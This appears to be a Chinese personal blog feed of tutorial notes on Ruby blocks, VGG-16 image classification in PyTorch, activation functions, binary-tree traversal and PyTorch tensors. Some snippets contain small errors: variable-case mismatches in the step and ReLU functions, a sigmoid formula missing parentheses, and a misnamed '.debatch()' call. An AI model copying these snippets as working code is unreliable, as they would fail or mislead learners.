class="token string">"</span></span>  <span class="token comment"># 执行额外的自定义逻辑或初始化操作</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Person</code>类具有<code>name</code>和<code>age</code>实例变量，并定义了一个初始化器。当创建一个<code>Person</code>对象时，可以传递一个块代码给初始化器，并使用<code>yield(self)</code>调用该块代码。块代码可以访问传递给它的<code>Person</code>对象，以便执行自定义的初始化操作。</p><p>通过使用<code>yield(self)</code>，你可以在对象实例化的过程中以一种灵活的方式执行额外的代码，并与当前对象进行交互。这对于执行一些初始化逻辑、设置默认值或注册回调等操作非常有用。</p><p>注意：<code>attr_accessor :name, :age</code>是Ruby中的一个简便方法，用于定义对象的属性（属性访问器）。</p><p><code>attr_accessor</code>是一个Ruby的关键字，它接受一个或多个属性名作为参数，并为每个属性生成对应的读取器（getter）和写入器（setter）方法。</p><p>在这个特定的例子中，<code>attr_accessor :name, :age</code>会为类或模块中的实例变量<code>@name</code>和<code>@age</code>生成以下方法：</p><ol><li>读取器方法（getter）：生成一个方法来获取属性的值。对于属性<code>:name</code>，生成的方法名为<code>name</code>，通过调用<code>object.name</code>来获取<code>@name</code>的值。对于属性<code>:age</code>，生成的方法名为<code>age</code>，通过调用<code>object.age</code>来获取<code>@age</code>的值。</li><li>写入器方法（setter）：生成一个方法来设置属性的值。对于属性<code>:name</code>，生成的方法名为<code>name=</code>，通过调用<code>object.name = new_value</code>来设置<code>@name</code>的值为<code>new_value</code>。对于属性<code>:age</code>，生成的方法名为<code>age=</code>，通过调用<code>object.age = new_value</code>来设置<code>@age</code>的值为<code>new_value</code>。</li></ol><h3 id="参考说明"><a href="#参考说明" class="headerlink" title="参考说明"></a>参考说明</h3><p><a href="https://www.yiibai.com/ruby/blocks.html">易百教程</a></p><p><a href="https://www.runoob.com/ruby/ruby-block.html">菜鸟教程</a></p>]]></content>
      
      
      <categories>
          
          <category> Ruby </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ruby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像分类(VGG)(1)</title>
      <link href="/2023/10/14/tu-xiang-fen-lei-vgg-1/"/>
      <url>/2023/10/14/tu-xiang-fen-lei-vgg-1/</url>
      
        <content type="html"><![CDATA[<h1 id="已完成训练的VGG模型的使用方法"><a href="#已完成训练的VGG模型的使用方法" class="headerlink" title="已完成训练的VGG模型的使用方法"></a>已完成训练的VGG模型的使用方法</h1><p>使用ImageNet数据集中已经提前训练好网络参数的VGG-16模型来实现对未知图片进行自动分类处理的程序。<br>ImageNet是斯坦福大学从互联网上收集的已分类的图像数据集，ILSVRC竞赛常用（ImageNet Large Scale Visual Recognition Challenge）<br>Torch中可以轻松使用ImageNet数据集中的ILSVRC2012数据集（分类数：1000种；训练用数据：120万张；验证用数据：5万张；测试用数据：10万张）</p><h2 id="文件夹准备"><a href="#文件夹准备" class="headerlink" title="文件夹准备"></a>文件夹准备</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">import</span> zipfile<span class="token comment">#·文件夹“data”不存在时制作</span>data_dir <span class="token operator">=</span> <span class="token string">"./data/"</span><span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>data_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>data_dir<span class="token punctuation">)</span><span class="token comment">#下载ImageNet的class_index</span><span class="token comment">#是在Keras准备的。</span><span class="token comment"># https://github.com/fchollet/deep-learning-models/blob/master/imagenet_utils.py</span>url <span class="token operator">=</span> <span class="token string">"https://s3.amazonaws.com/deep-learning-models/image-models/imagenet_class_index.json"</span>save_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>data_dir<span class="token punctuation">,</span> <span class="token string">"imagenet_class_index.json"</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>save_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlretrieve<span class="token punctuation">(</span>url<span class="token punctuation">,</span> save_path<span class="token punctuation">)</span><span class="token comment">#1.3下载并解压缩你要用到的蚂蚁和蜜蜂的图像数据</span><span class="token comment"># 是在PyTorch指南课程中准备的。</span><span class="token comment"># https://pytorch.org/tutorials/beginner/transfer_learning_tutorial.html</span>url <span class="token operator">=</span> <span class="token string">"https://download.pytorch.org/tutorial/hymenoptera_data.zip"</span>save_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>data_dir<span class="token punctuation">,</span> <span class="token string">"hymenoptera_data.zip"</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>save_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlretrieve<span class="token punctuation">(</span>url<span class="token punctuation">,</span> save_path<span class="token punctuation">)</span>    <span class="token comment"># 读取ZIP文件</span>    <span class="token builtin">zip</span> <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>save_path<span class="token punctuation">)</span>    <span class="token builtin">zip</span><span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>data_dir<span class="token punctuation">)</span>  <span class="token comment"># 解压缩ZIP</span>    <span class="token builtin">zip</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 盗取ZIP文件</span>    <span class="token comment">#删除ZIP文件</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>save_path<span class="token punctuation">)</span>【※（实施完）】手动下载金毛寻回犬的图像https<span class="token punctuation">:</span><span class="token operator">//</span>pixabay<span class="token punctuation">.</span>com<span class="token operator">/</span>ja<span class="token operator">/</span>photos<span class="token operator">/</span>goldenretriever<span class="token operator">-</span><span class="token operator">%</span>E7<span class="token operator">%</span>8A<span class="token operator">%</span>AC<span class="token operator">-</span><span class="token number">3724972</span><span class="token operator">/</span>640x426尺寸的图像（图片版权信息<span class="token punctuation">:</span>CCO Creative Commons，免费商业使用，无需标注归属）将其直接放在文件夹“data”的下方。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p>导入软件包</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 导入软件包</span><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> json<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token operator">%</span>matplotlib inline<span class="token keyword">import</span> torch<span class="token keyword">import</span> torchvision<span class="token keyword">from</span> torchvision <span class="token keyword">import</span> models<span class="token punctuation">,</span> transforms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>VGG-16已完成训练模型的载入</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#VGG-16已完成训练模型的载入</span><span class="token comment"># 第一次执行时，由于需要从网络下载学习好的参数数据，因此执行时间会稍微长一些</span><span class="token comment">#生成VGG-16模型的实例</span>use_pretrained <span class="token operator">=</span> <span class="token boolean">True</span>  <span class="token comment"># 使用已经训练好的参数</span>net <span class="token operator">=</span> models<span class="token punctuation">.</span>vgg16<span class="token punctuation">(</span>pretrained<span class="token operator">=</span>use_pretrained<span class="token punctuation">)</span>net<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 设置为推测模式</span><span class="token comment">#  输出模型的网络结构</span><span class="token keyword">print</span><span class="token punctuation">(</span>net<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现一个对输入图片进行预处理的类BaseTransform()<br>注意：这里的__call__()作用是，如果不指定函数名而直接调用实例的变量名，<strong>call</strong>()函数内的代码直接会被执行。这里等于说就是直接返回一个被预处理过后的一个图片。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 对输入图片进行预处理的类</span><span class="token keyword">class</span> <span class="token class-name">BaseTransform</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    调整图片的尺寸，并对颜色进行规范化。    Attributes    ----------    resize : int       指定调整尺寸后图片的大小    mean : (R, G, B)       各个颜色通道的平均值    std : (R, G, B)       各个颜色通道的标准偏差    """</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> resize<span class="token punctuation">,</span> mean<span class="token punctuation">,</span> std<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>base_transform <span class="token operator">=</span> transforms<span class="token punctuation">.</span>Compose<span class="token punctuation">(</span><span class="token punctuation">[</span>            transforms<span class="token punctuation">.</span>Resize<span class="token punctuation">(</span>resize<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">#将较短边的长度作为resize的大小</span>            transforms<span class="token punctuation">.</span>CenterCrop<span class="token punctuation">(</span>resize<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">#从图片中央截取resize × resize大小的区域</span>            transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">#转换为Torch张量</span>            transforms<span class="token punctuation">.</span>Normalize<span class="token punctuation">(</span>mean<span class="token punctuation">,</span> std<span class="token punctuation">)</span>  <span class="token comment">#颜色信息的正规化</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> img<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>base_transform<span class="token punctuation">(</span>img<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>plt.show()一下预处理的效果，可省略.</p><p>注意：由于tentor即张量为( 颜色、高度、宽度 )，转换成np后需要转换为 ( 高度、宽度、颜色 )img_transformed = img_transformed.numpy().transpose((1, 2, 0))，如何限制范围为0~1，img_transformed = np.clip(img_transformed, 0, 1)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#确认图像预处理的结果</span><span class="token comment"># 1. 读取图片</span>image_file_path <span class="token operator">=</span> <span class="token string">'./xxxxxxxxxx/xxx.jpg'</span>img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>image_file_path<span class="token punctuation">)</span>  <span class="token comment"># [高度][宽度][颜色RGB]</span><span class="token comment"># 2.  显示处理前的图片示</span>plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>img<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 3. 同时显示预处理前后的图片</span>resize <span class="token operator">=</span> <span class="token number">224</span>mean <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0.485</span><span class="token punctuation">,</span> <span class="token number">0.456</span><span class="token punctuation">,</span> <span class="token number">0.406</span><span class="token punctuation">)</span>std <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0.229</span><span class="token punctuation">,</span> <span class="token number">0.224</span><span class="token punctuation">,</span> <span class="token number">0.225</span><span class="token punctuation">)</span>transform <span class="token operator">=</span> BaseTransform<span class="token punctuation">(</span>resize<span class="token punctuation">,</span> mean<span class="token punctuation">,</span> std<span class="token punctuation">)</span>img_transformed <span class="token operator">=</span> transform<span class="token punctuation">(</span>img<span class="token punctuation">)</span>  <span class="token comment"># torch.Size([3, 224, 224])</span><span class="token comment"># 将 ( 颜色、高度、宽度 ) 转换为 ( 高度、宽度、颜色 )，并将取值范围限制在0~1</span>img_transformed <span class="token operator">=</span> img_transformed<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>transpose<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>img_transformed <span class="token operator">=</span> np<span class="token punctuation">.</span>clip<span class="token punctuation">(</span>img_transformed<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>img_transformed<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现一个处理输出后结果进行预测的类ILSVRCPredictor()，即实现将VGG16模型1000维的输出结果转换为分类标签的ILSVRCPredictor类。</p><p>从VGG-16模型输出的数值被保存到大小为torch.Size([1,1000])的PyTorch张量中，这里需要将其转换为NumPy变量。因此调用.debatch(),将输出结果从网路中分离出来；然后，对被debatch的张量进行.numpy()调用，将其转换为numpy变量，并用np.argmax()获取最大值的索引。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ILSVRC_class_index <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./data/imagenet_class_index.json'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 根据输出结果对标签进行预测的后处理类</span><span class="token keyword">class</span> <span class="token class-name">ILSVRCPredictor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    根据ILSVRC数据，从模型的输出结果计算出分类标签    Attributes    ----------    class_index : dictionary           将类的index与标签名关联起来的字典型变量    """</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> class_index<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>class_index <span class="token operator">=</span> class_index    <span class="token keyword">def</span> <span class="token function">predict_max</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> out<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        获得概率最大的ILSVRC分类标签名        Parameters        ----------        out : torch.Size([1, 1000])            从Net中输出结果        Returns        -------        predicted_label_name : str            预测概率最高的分类标签的名称        """</span>        maxid <span class="token operator">=</span> np<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>out<span class="token punctuation">.</span>detach<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#str()将数字-&gt;字符，class_index是字典，所以key是字符，故str(),再然后values是一个列表，列表第二个元素是#所分类别的名字,故[1]</span>        predicted_label_name <span class="token operator">=</span> self<span class="token punctuation">.</span>class_index<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>maxid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> predicted_label_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用已完成学习的VGG开始预测手头的图片啦</p><p>整理一下思路，输入的图片经过BaseTransform()预处理转换后，被作为VGG-16模型的输入数据输入。模型输出的1000维数据又经过ISVRCPredicor的处理，被转换为预测概率最高的分类标签名，并作为最终的输出结果返回。</p><p>注意，在将图片输入PyTorch网络中，需一小批次的形式传递，故使用.unsqueeze_(0),（英语单词非压缩，即扩展）0代表是第一维度，作用就是扩展一个维度，在整体大小不变的情况下，且增大的维度是第一维度（确实就batch_size=1）。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 载入ILSVRC的标签信息，并生成字典型变量</span>ILSVRC_class_index <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./data/imagenet_class_index.json'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 生成ILSVRCPredictor的实例</span>predictor <span class="token operator">=</span> ILSVRCPredictor<span class="token punctuation">(</span>ILSVRC_class_index<span class="token punctuation">)</span><span class="token comment"># 读取输入的图像</span>image_file_path <span class="token operator">=</span> <span class="token string">'./xxxx/xxxx.jpg'</span>img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>image_file_path<span class="token punctuation">)</span>  <span class="token comment"># [ 高度 ][ 宽度 ][ 颜色RGB]</span><span class="token comment"># 完成预处理后，添加批次尺寸的维度</span>transform <span class="token operator">=</span> BaseTransform<span class="token punctuation">(</span>resize<span class="token punctuation">,</span> mean<span class="token punctuation">,</span> std<span class="token punctuation">)</span>  <span class="token comment">#创建预处理类</span>img_transformed <span class="token operator">=</span> transform<span class="token punctuation">(</span>img<span class="token punctuation">)</span>  <span class="token comment"># torch.Size([3, 224, 224])</span>inputs <span class="token operator">=</span> img_transformed<span class="token punctuation">.</span>unsqueeze_<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># torch.Size([1, 3, 224, 224])</span><span class="token comment"># 输入数据到模型中，并将模型的输出转换为标签</span>out <span class="token operator">=</span> net<span class="token punctuation">(</span>inputs<span class="token punctuation">)</span>  <span class="token comment"># torch.Size([1, 1000])</span>result <span class="token operator">=</span> predictor<span class="token punctuation">.</span>predict_max<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token comment"># 输出预测结果</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"输入图像的预测结果："</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度学习入门笔记</title>
      <link href="/2023/10/14/shen-du-xue-xi-ru-men-bi-ji/"/>
      <url>/2023/10/14/shen-du-xue-xi-ru-men-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h2><p>activation function :将输入信号的总和转换为输出信号，作用就是决定如何激活输入信号的总和。</p><h3 id="sigmoid-func"><a href="#sigmoid-func" class="headerlink" title="sigmoid func"></a>sigmoid func</h3><p>h(x) = 1 / 1 + exp(-x)</p><h3 id="阶跃函数"><a href="#阶跃函数" class="headerlink" title="阶跃函数"></a>阶跃函数</h3><p>相当于感知机  </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">step_fun</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> X <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token number">1</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token comment">#np的类型</span><span class="token keyword">def</span> <span class="token function">step_fun</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    y <span class="token operator">=</span> x <span class="token operator">&gt;</span> <span class="token number">0</span>  <span class="token keyword">return</span> y<span class="token punctuation">.</span>astype<span class="token punctuation">(</span>np<span class="token punctuation">.</span><span class="token builtin">int</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ReLU函数"><a href="#ReLU函数" class="headerlink" title="ReLU函数"></a>ReLU函数</h3><p>Rectified Linear Unit</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">relu</span><span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> np<span class="token punctuation">.</span>maximum<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="nn重要概念"><a href="#nn重要概念" class="headerlink" title="nn重要概念"></a>nn重要概念</h2><p>神经网络内积：<br><img src="/2023/10/14/shen-du-xue-xi-ru-men-bi-ji/20181219152354924.png"><br><img src="/2023/10/14/shen-du-xue-xi-ru-men-bi-ji/2.png"><br>输出层： softmax（）：yk = exp (ak) / exp (a1+a2+…+an)</p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉树遍历(算法)</title>
      <link href="/2023/04/13/er-cha-shu-bian-li-suan-fa/"/>
      <url>/2023/04/13/er-cha-shu-bian-li-suan-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h1><p><a href="https://www.acwing.com/problem/content/description/3387/">原题</a><br>思路：树的遍历<br>题意：已知二叉树的前序遍历(带有空节点位置)求中序遍历<br>一边“建树”，一边输出</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token char">'#'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> ch <span class="token operator">&lt;&lt;</span> <span class="token char">' '</span><span class="token punctuation">;</span>    <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> 二叉树 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动手学深度学习（1）</title>
      <link href="/2023/04/12/dong-shou-xue-shen-du-xue-xi-1/"/>
      <url>/2023/04/12/dong-shou-xue-shen-du-xue-xi-1/</url>
      
        <content type="html"><![CDATA[<h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><h2 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h2><p>在PyTorch中，torch.Tensor是存储和变换数据的主要工具。Tensor和NumPy的多维数组非常类似。然而，Tensor提供GPU计算和自动求梯度等更多功能，这些使Tensor更加适合深度学习。</p><p>“tensor”这个单词一般可译作“张量”，张量可以看作是一个多维数组。标量可以看作是0维张量，向量可以看作1维张量，矩阵可以看作是二维张量。</p><h3 id="创建Tensor"><a href="#创建Tensor" class="headerlink" title="创建Tensor"></a>创建Tensor</h3><p>首先导入pytorch</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后创建一个5x3的未初始化的Tensor</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> torch<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>创建一个5x3的随机初始化的Tensor</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> torch<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>创建一个5x3的long型全0的Tensor</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> torch<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span><span class="token builtin">long</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以根据数据创建</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">5.5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># tensor([5.5000, 3.0000])</span><span aria-hidden="true" 